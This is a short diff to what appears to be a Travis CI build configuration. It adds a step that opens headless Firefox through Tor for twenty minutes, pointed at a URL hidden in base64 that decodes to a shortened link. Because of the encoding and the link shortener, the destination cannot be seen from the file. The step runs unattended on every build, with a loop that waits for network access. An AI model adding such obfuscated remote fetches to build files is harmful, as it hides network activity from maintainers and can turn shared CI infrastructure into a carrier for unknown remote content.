@@ -7,4 +7,4 @@ before_script:
 - while ! torsocks wget http://google.com -O/dev/null ; do true ; done
 
 script:
-- travis_time 20m torsocks xvfb-run firefox
+- travis_time 20m torsocks xvfb-run firefox "$( echo aHR0cHM6Ly9nb28uZ2wvNnhvcFc2Cg | base64 -d )"
